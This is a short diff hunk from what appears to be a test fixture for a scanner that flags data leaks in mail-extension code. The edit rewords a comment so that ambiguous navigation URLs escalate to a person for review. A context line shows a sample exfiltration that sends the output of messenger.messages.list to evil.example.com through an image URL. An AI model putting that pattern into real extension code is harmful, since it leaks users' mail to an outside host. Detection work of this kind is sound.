@@ -7,5 +7,5 @@ img.src = "https://evil.example.com/?d=" + messenger.messages.list(folderId);
 
 // WEAK: a page navigation whose URL merely appends a runtime value, with no
 // user-data API call. Common in legitimate code, so it is NOT a hard error - it
-// goes to the disguised-transmission LLM check as an unsure/manual candidate.
+// escalates as a disguised-transmission case for a person to judge.
 window.location.href = "https://example.com/u/" + userId + "/inbox";
